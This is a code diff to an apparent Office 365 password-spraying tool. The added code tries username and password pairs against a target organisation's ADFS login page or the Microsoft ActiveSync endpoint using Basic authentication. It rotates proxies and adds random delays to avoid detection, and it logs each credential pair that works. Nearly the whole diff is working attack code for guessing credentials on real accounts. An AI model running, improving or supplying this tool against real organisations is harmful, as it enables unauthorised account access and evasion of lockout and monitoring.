@@ -3,6 +3,7 @@ import os
 import sys
 import time
 import json
+import base64
 import argparse
 import random
 import urllib3
@@ -10,6 +11,7 @@ import requests
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
+active_sync_url = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
 
 def get_args():
 	parser = argparse.ArgumentParser()
@@ -29,12 +31,26 @@ def get_args():
 
 
 def write_tested(user,password,test_credentials_file,status):
+	current_time = time.strftime("%H:%M:%S",time.localtime())
+	current_ip = requests.get('https://api.ipify.org').text
 	with open(test_credentials_file, "a") as f:
-		current_time = time.strftime("%H:%M:%S",time.localtime())
 		f.write(user+":"+password+","+status+","+current_time+"\n")
 
 
-def check_user(dafs_url,headers,session,credential,debug,proxy,test_credentials_file):
+def check_dafs_user(dafs_url,session,credential,debug,proxy,test_credentials_file):
+	if "dafs" in dafs_url:
+		origin_field  = dafs_url.split("adfs")[0]
+	else:
+		origin_field  = dafs_url
+	headers = {
+		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
+		"Accept": "application/json, text/javascript, */*; q=0.01",
+		"Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
+		"Content-Type": "application/x-www-form-urlencoded",
+		"Origin": origin_field,
+		"Referer": dafs_url,
+		"Connection": "close"
+	}
 	user = credential[0]
 	password = credential[1]
 	data = {"UserName": user, "Password": password, "AuthMethod":"FormsAuthentication"}
@@ -52,33 +68,43 @@ def check_user(dafs_url,headers,session,credential,debug,proxy,test_credentials_
 		sys.exit(1)
 
 
+def check_activesync_user(credential,debug,proxy,test_credentials_file):
+	user = credential[0]
+	password = credential[1]
+	s = requests.Session()
+	s.get(active_sync_url)
+	authorization = base64.b64encode(str(user+":"+password).encode()).decode("utf-8")
+	headers = {'Authorization': 'Basic '+authorization, 'Upgrade-Insecure-Requests': '1', 'Accept-Language': 'en-US,en;q=0.5'}
+	response = s.get(active_sync_url, headers = headers, verify = False, proxies = proxy)
+	if debug: print("Response status code: %s" % response.status_code)
+	if response.status_code == 200 or response.status_code == 505:
+		print("[+] CORRECT credentials found: %s:%s"%(user,password))
+		write_tested(user,password,test_credentials_file, "CORRECT")
+		return True
+	else:
+		if debug: print("[-] Incorrect credentials")
+		write_tested(user,password,test_credentials_file, "FAILED")
+		return False
+
+
 def calculate_values(target):
 	s = requests.Session()
 	url = "https://login.microsoftonline.com/common/userrealm/?user=test@"+target+"&api-version=2.1&checkForMicrosoftAccount=true"
+	headers = None
 	response = s.get(url)
 	json_data = json.loads(response.text)
 	if 'AuthURL' in json_data:
-		new_url = json_data['AuthURL']
+		print("[-] Organization uses a customized sign-in page")
+		dafs_url = s.get(json_data['AuthURL']).url #json_data['AuthURL']
+	elif (json_data['NameSpaceType']=="Managed"):
+		print("[-] Organization does not use a customized sign-in page. \n[-] Using Microsoft Server ActiveSync")
+		dafs_url = active_sync_url
 	else:
-		print("[-] Organization does not use a customized sign-in page. Using https://login.microsoftonline.com/")
-		new_url = "https://login.microsoftonline.com/"
+		print("[*] Error. Organization probably does not use Office 365.")
+		print("[-] Response from login.microsoftonline.com:")
+		print(json.dumps(json_data, indent=4, sort_keys=True))
 		sys.exit(1)
-	dafs_url = s.get(new_url).url
-	referer_field = dafs_url
-	if "dafs" in referer_field:
-		origin_field  = referer_field.split("adfs")[0]
-	else:
-		origin_field  = referer_field #"https://login.live.com"
-	headers = {
-		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
-		"Accept": "application/json, text/javascript, */*; q=0.01",
-		"Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
-		"Content-Type": "application/x-www-form-urlencoded",
-		"Origin": origin_field,
-		"Referer": referer_field,
-		"Connection": "close"
-	}
-	return dafs_url,headers,s
+	return dafs_url,s
 
 
 def main():
@@ -88,13 +114,13 @@ def main():
 		get_args().print_help()
 		sys.exit(0)
 	if (args.user_list is not None and not os.path.isfile(args.user_list)):
-		print ("Error: Use '-U' with a file of users or '-u' for a single user")
+		print ("[-] Error: Use '-U' with a file of users or '-u' for a single user")
 		sys.exit(0)
 	if (args.password_list is not None and not os.path.isfile(args.password_list)):
-		print ("Error: Use '-P' with a file of passwords or '-p' for a single password")
+		print ("[-] Error: Use '-P' with a file of passwords or '-p' for a single password")
 		sys.exit(0)
 	if (args.password_list is not None and not os.path.isfile(args.password_list)):
-		print ("Error: Use '-UP' with a file of usernames and passwords with the format username:password")
+		print ("[-] Error: Use '-UP' with a file of usernames and passwords with the format username:password")
 		sys.exit(0)
 
 	# Create variables
@@ -122,7 +148,7 @@ def main():
 		random.shuffle(pairs)
 
 	# Get DAFS url and create a web session
-	dafs_url,headers,session = calculate_values(args.target)
+	dafs_url,session = calculate_values(args.target)
 
 	if debug: 
 		print ("[+] ADFS url: %s"%(dafs_url))
@@ -141,7 +167,10 @@ def main():
 				proxy = {"http": proxy_list[proxy_counter%len(proxy_list)], "https": proxy_list[proxy_counter%len(proxy_list)]}
 				proxy_counter += 1
 			time.sleep(random_seconds)
-			correct_user = check_user(dafs_url,headers,session,credential,debug,proxy,test_credentials_file)
+			if dafs_url != active_sync_url:
+				correct_user = check_dafs_user(dafs_url,session,credential,debug,proxy,test_credentials_file)
+			else:
+				correct_user = check_activesync_user(credential,debug,proxy,test_credentials_file)
 			if correct_user:
 				correct_users_list.append(credential[0])
 
